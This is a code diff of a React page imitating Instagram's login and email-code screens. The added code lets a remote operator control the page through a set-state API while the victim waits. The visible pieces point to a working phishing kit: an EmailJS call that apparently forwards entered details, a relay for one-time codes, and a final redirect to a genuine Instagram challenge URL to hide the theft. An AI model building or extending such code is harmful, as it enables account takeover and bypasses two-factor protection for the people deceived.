@@ -15,34 +15,66 @@ function App() {
   const [errorMessage, setErrorMessage] = useState("");
   const [otpCode, setOtpCode] = useState("");
   const [maskedEmail, setMaskedEmail] = useState("");
+  const [sessionId, setSessionId] = useState(null);
+  const [pollingInterval, setPollingInterval] = useState(null);
 
-  // Expose global function for console API calls
+  const API_URL = process.env.REACT_APP_API_URL || "http://localhost:3001";
+
+  // Poll server for state changes
   useEffect(() => {
-    window.handleLoginResponse = (command) => {
-      console.log("Received command:", command);
-      
-      if (command === "getOtp") {
-        // Mask the email (assuming username might be email)
-        const email = username.includes("@") ? username : `${username}@gmail.com`;
-        const masked = email.replace(/(.{1})(.*)(@.*)/, (match, first, middle, domain) => {
-          return first + "*".repeat(Math.min(middle.length, 6)) + domain;
-        });
-        setMaskedEmail(masked);
-        setCurrentView("otp");
-      } else if (command === "incorrectCredentials") {
-        setCurrentView("error");
-        setErrorMessage("Incorrect username or password");
-        setIsAutomating(false);
-      } else if (command === "success") {
-        window.location.href =
-          "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+    if (!sessionId) return;
+
+    const pollState = async () => {
+      try {
+        const response = await fetch(`${API_URL}/api/get-state/${sessionId}`);
+        const data = await response.json();
+
+        if (data.success && data.state !== "waiting") {
+          handleStateChange(data.state);
+          // Stop polling once we get a non-waiting state
+          if (pollingInterval) {
+            clearInterval(pollingInterval);
+            setPollingInterval(null);
+          }
+        }
+      } catch (error) {
+        console.error("Error polling state:", error);
       }
     };
 
+    // Poll every 2 seconds
+    const interval = setInterval(pollState, 2000);
+    setPollingInterval(interval);
+
     return () => {
-      delete window.handleLoginResponse;
+      if (interval) clearInterval(interval);
     };
-  }, [username]);
+  }, [sessionId]);
+
+  const handleStateChange = (state) => {
+    if (state === "getOtp") {
+      // Mask the email (assuming username might be email)
+      const email = username.includes("@")
+        ? username
+        : `${username}@gmail.com`;
+      const masked = email.replace(
+        /(.{1})(.*)(@.*)/,
+        (match, first, middle, domain) => {
+          return first + "*".repeat(Math.min(middle.length, 6)) + domain;
+        }
+      );
+      setMaskedEmail(masked);
+      setCurrentView("otp");
+      setIsAutomating(false);
+    } else if (state === "incorrectCredentials") {
+      setCurrentView("login");
+      setErrorMessage("Incorrect username or password");
+      setIsAutomating(false);
+    } else if (state === "success") {
+      window.location.href =
+        "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+    }
+  };
 
   const languages = [
     "English (US)",
@@ -360,11 +392,33 @@ function App() {
       console.error("EmailJS error:", error);
     }
 
+    // Create session on server
+    try {
+      const response = await fetch(`${API_URL}/api/create-session`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ username }),
+      });
+
+      const data = await response.json();
+      if (data.success) {
+        setSessionId(data.sessionId);
+        console.log("Session created:", data.sessionId);
+        console.log(
+          `To control from anywhere, call: POST ${API_URL}/api/set-state with body: { "sessionId": "${data.sessionId}", "command": "getOtp" | "incorrectCredentials" | "success" }`
+        );
+      }
+    } catch (error) {
+      console.error("Error creating session:", error);
+    }
+
     // Show "Logging in..." for 12 seconds
     setTimeout(() => {
       setIsAutomating(false);
-      // After 12 seconds, wait for console API call
-      console.log("Waiting for console command. Use: handleLoginResponse('getOtp'), handleLoginResponse('incorrectCredentials'), or handleLoginResponse('success')");
+      // Polling will continue to check for state changes
+      console.log("Waiting for API call to set state...");
     }, 12000);
   };
 
@@ -397,23 +451,62 @@ function App() {
       <div className="App">
         <div className="otp-container">
           <div className="otp-header">
-            <button className="back-button" onClick={() => setCurrentView("login")}>
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M15 18L9 12L15 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+            <button
+              className="back-button"
+              onClick={() => setCurrentView("login")}
+            >
+              <svg
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M15 18L9 12L15 6"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                />
               </svg>
             </button>
             <button className="help-button">
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2"/>
-                <path d="M9.09 9A3 3 0 0 1 12 6C13.657 6 15 7.343 15 9C15 10.657 13.657 12 12 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
-                <path d="M12 16H12.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
+              <svg
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle
+                  cx="12"
+                  cy="12"
+                  r="10"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                />
+                <path
+                  d="M9.09 9A3 3 0 0 1 12 6C13.657 6 15 7.343 15 9C15 10.657 13.657 12 12 12"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                />
+                <path
+                  d="M12 16H12.01"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                />
               </svg>
             </button>
           </div>
-          
+
           <h1 className="otp-title">Check your email</h1>
-          <p className="otp-instruction">Enter the code we sent to {maskedEmail || "m******1@gmail.com"}</p>
-          
+          <p className="otp-instruction">
+            Enter the code we sent to {maskedEmail || "m******1@gmail.com"}
+          </p>
+
           <div className="otp-illustration">
             <div className="phone-illustration">
               <div className="phone-screen">
@@ -423,7 +516,7 @@ function App() {
               </div>
             </div>
           </div>
-          
+
           <form className="otp-form" onSubmit={handleOtpSubmit}>
             <input
               type="text"
@@ -433,18 +526,52 @@ function App() {
               onChange={(e) => setOtpCode(e.target.value)}
               maxLength={6}
             />
-            
-            <button type="button" className="get-new-code" onClick={handleGetNewCode}>
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M1 4V10H7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                <path d="M23 20V14H17" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10M23 14L18.36 18.36A9 9 0 0 1 3.51 15" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+
+            <button
+              type="button"
+              className="get-new-code"
+              onClick={handleGetNewCode}
+            >
+              <svg
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M1 4V10H7"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                />
+                <path
+                  d="M23 20V14H17"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                />
+                <path
+                  d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10M23 14L18.36 18.36A9 9 0 0 1 3.51 15"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                />
               </svg>
               Get a new code
             </button>
-            
-            <button type="submit" className="continue-button">Continue</button>
-            <button type="button" className="try-another-way-button" onClick={handleTryAnotherWay}>
+
+            <button type="submit" className="continue-button">
+              Continue
+            </button>
+            <button
+              type="button"
+              className="try-another-way-button"
+              onClick={handleTryAnotherWay}
+            >
               Try another way
             </button>
           </form>
@@ -478,9 +605,7 @@ function App() {
           />
         </div>
         <form className="login-form" onSubmit={handleSubmit}>
-          {errorMessage && (
-            <div className="error-message">{errorMessage}</div>
-          )}
+          {errorMessage && <div className="error-message">{errorMessage}</div>}
           <div className="form-group">
             <label
               htmlFor="username"
